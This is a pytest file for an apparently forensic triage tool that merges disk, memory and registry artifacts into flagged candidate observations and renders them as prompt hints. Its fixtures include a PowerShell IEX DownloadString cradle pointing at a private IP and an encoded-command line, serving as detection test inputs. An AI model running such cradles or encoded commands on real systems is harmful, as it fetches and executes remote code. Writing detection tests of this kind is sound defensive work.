from sift_sentinel.analysis.candidate_observations import (
    build_candidate_observations,
    normalize_path,
    render_candidate_observations_for_prompt,
)


def _db(*facts):
    typed = {}
    for f in facts:
        typed.setdefault(f["fact_type"], []).append(f)
    return {"typed_facts": typed}


def _by_entity(payload, prefix):
    return [c for c in payload["candidates"] if str(c["entity_key"]).startswith(prefix)]


def test_normalize_path_merges_windows_and_mount_forms():
    assert normalize_path(r"C:\Windows\Temp\Perfmon\PsExec.exe") == "windows/temp/perfmon/psexec.exe"
    assert normalize_path("/Windows/Temp/perfmon/PsExec.exe") == "windows/temp/perfmon/psexec.exe"


def test_staging_admin_tool_merges_across_sources_and_is_ready():
    payload = build_candidate_observations(_db(
        {
            "fact_id": "file_execution_fact-1",
            "fact_type": "file_execution_fact",
            "source_tool": "get_amcache",
            "record_ref": "get_amcache#1",
            "path": r"C:\Windows\Temp\Perfmon\PsExec.exe",
            "raw_excerpt": r"C:\Windows\Temp\Perfmon\PsExec.exe",
        },
        {
            "fact_id": "file_execution_fact-2",
            "fact_type": "file_execution_fact",
            "source_tool": "extract_mft_timeline",
            "record_ref": "extract_mft_timeline#2",
            "path": "/Windows/Temp/perfmon/PsExec.exe",
            "raw_excerpt": "/Windows/Temp/perfmon/PsExec.exe",
        },
    ))
    matches = _by_entity(payload, "path:windows/temp/perfmon/psexec.exe")
    assert len(matches) == 1
    cand = matches[0]
    assert cand["validation_ready"] is True
    assert set(cand["source_tools"]) == {"get_amcache", "extract_mft_timeline"}
    assert "execution_from_staging_path" in cand["signals"]
    assert "admin_or_lolbin_artifact" in cand["signals"]


def test_normal_windows_driver_service_is_not_validation_ready():
    payload = build_candidate_observations(_db(
        {
            "fact_id": "registry_persistence_fact-1",
            "fact_type": "registry_persistence_fact",
            "source_tool": "parse_registry_persistence",
            "record_ref": "parse_registry_persistence#1",
            "service_name": "ACPI",
            "registry_path": r"HKLM\SYSTEM\ControlSet001\Services\ACPI",
            "value_name": "ImagePath",
            "value_data": r"System32\drivers\ACPI.sys",
            "persistence_type": "service",
            "raw_excerpt": r"HKLM\SYSTEM\ControlSet001\Services\ACPI ImagePath System32\drivers\ACPI.sys",
        },
    ))
    acpi = [c for c in payload["candidates"] if c["entity_key"] == "service:acpi"]
    assert not any(c["validation_ready"] for c in acpi)


def test_memory_injection_with_process_context_is_ready():
    payload = build_candidate_observations(_db(
        {
            "fact_id": "process_fact-1",
            "fact_type": "process_fact",
            "source_tool": "vol_pstree",
            "record_ref": "vol_pstree#1",
            "pid": 4242,
            "process_name": "powershell.exe",
            "image_name": "powershell.exe",
            "raw_excerpt": "powershell.exe PID 4242",
        },
        {
            "fact_id": "memory_injection_fact-1",
            "fact_type": "memory_injection_fact",
            "source_tool": "vol_malfind",
            "record_ref": "vol_malfind#1",
            "pid": 4242,
            "process_name": "powershell.exe",
            "protection": "PAGE_EXECUTE_READWRITE",
            "raw_excerpt": "PID 4242 PAGE_EXECUTE_READWRITE injected region",
        },
    ))
    pid_cands = _by_entity(payload, "pid:4242")
    assert pid_cands
    assert any(c["validation_ready"] and c["candidate_type"] == "memory_injection" for c in pid_cands)


def test_private_ip_url_is_internal_staging_not_external_c2():
    payload = build_candidate_observations(_db(
        {
            "fact_id": "network_ioc_fact-1",
            "fact_type": "network_ioc_fact",
            "source_tool": "extract_network_iocs",
            "record_ref": "extract_network_iocs#1",
            "classification": "private",
            "raw_excerpt": "powershell IEX DownloadString('http://10.1.2.3:8080/a')",
        },
    ))
    types = {c["candidate_type"] for c in payload["candidates"]}
    assert "network_c2_or_external_peer" not in types
    assert "encoded_powershell_or_download_cradle" in types or "internal_or_local_staging_network" in types


def test_windows_assembly_temp_dll_is_suppressed_not_ready():
    payload = build_candidate_observations(_db(
        {
            "fact_id": "file_execution_fact-assembly",
            "fact_type": "file_execution_fact",
            "source_tool": "extract_mft_timeline",
            "record_ref": "extract_mft_timeline#10",
            "path": "/Windows/assembly/temp/ABC/System.Management.ni.dll",
            "raw_excerpt": "/Windows/assembly/temp/ABC/System.Management.ni.dll",
        },
    ))
    assert not any(c["validation_ready"] for c in payload["candidates"])


def test_generic_rdp_context_does_not_become_ready_without_target():
    payload = build_candidate_observations(_db(
        {
            "fact_id": "rdp_artifact_fact-1",
            "fact_type": "rdp_artifact_fact",
            "source_tool": "parse_rdp_artifacts",
            "record_ref": "parse_rdp_artifacts#1",
            "raw_excerpt": "EventID=40 TimeCreated=2020-01-01T00:00:00Z",
        },
    ))
    assert not any(c["validation_ready"] for c in payload["candidates"])


def test_prompt_renderer_marks_candidates_as_hints_not_proof():
    payload = build_candidate_observations(_db(
        {
            "fact_id": "memory_injection_fact-1",
            "fact_type": "memory_injection_fact",
            "source_tool": "vol_malfind",
            "record_ref": "vol_malfind#1",
            "pid": 7,
            "process_name": "powershell.exe",
            "raw_excerpt": "PID 7 PAGE_EXECUTE_READWRITE",
        },
    ))
    prompt = render_candidate_observations_for_prompt(payload)
    assert "ZEROFAKE triage hints" in prompt
    assert "NOT findings" in prompt
    assert "memory_injection_fact-1" in prompt


def _synthetic_powershell_candidate_evdb(ttp_tags):
    fact_id = "powershell_command_fact-synthetic-encoded-1"
    fact = {
        "fact_id": fact_id,
        "fact_type": "powershell_command_fact",
        "source_tool": "parse_powershell_transcripts",
        "tool": "parse_powershell_transcripts",
        "record_ref": "parse_powershell_transcripts#synthetic-1",
        "artifact": ("parse_powershell_transcripts", "synthetic_transcript.txt", 42),
        "source_file": "synthetic_transcript.txt",
        "line_number": 42,
        "command": "powershell -NoProfile -EncodedCommand AAAA",
        "decoded_command": "",
        "ttp_tags": list(ttp_tags),
        "suspicious_markers": ["EncodedCommand", "NoProfile"] if ttp_tags else [],
        "urls": [],
        "domains": [],
        "ips": [],
        "paths": [],
        "user": "synthetic_user",
        "timestamp": "2026-01-01T00:00:00Z",
        "raw_excerpt": "powershell -NoProfile -EncodedCommand AAAA",
        "index": {"by_ttp_tag": list(ttp_tags)},
    }
    return {
        "typed_facts": {"powershell_command_fact": [fact]},
        "indexes": {"by_ttp_tag": {tag: [fact_id] for tag in ttp_tags}},
    }


def test_powershell_command_fact_with_ttp_tag_becomes_validation_ready_candidate():
    import json
    from sift_sentinel.analysis.candidate_observations import build_candidate_observations

    payload = build_candidate_observations(
        _synthetic_powershell_candidate_evdb(["encoded_command", "no_profile_hidden"])
    )
    candidates = [
        c for c in payload["candidates"]
        if "powershell_command_fact" in c.get("fact_types", [])
    ]

    assert candidates
    assert any(c.get("validation_ready") is True for c in candidates)

    rendered = json.dumps(candidates, sort_keys=True)
    assert "powershell_command" in rendered
    assert "claim_templates" in rendered
    assert "encoded_command" in rendered
    assert "encoded_powershell_or_download_cradle" in rendered


def test_powershell_command_fact_without_ttp_tag_is_not_validation_ready_candidate():
    from sift_sentinel.analysis.candidate_observations import build_candidate_observations

    payload = build_candidate_observations(_synthetic_powershell_candidate_evdb([]))
    candidates = [
        c for c in payload["candidates"]
        if "powershell_command_fact" in c.get("fact_types", [])
    ]

    assert not any(c.get("validation_ready") is True for c in candidates)
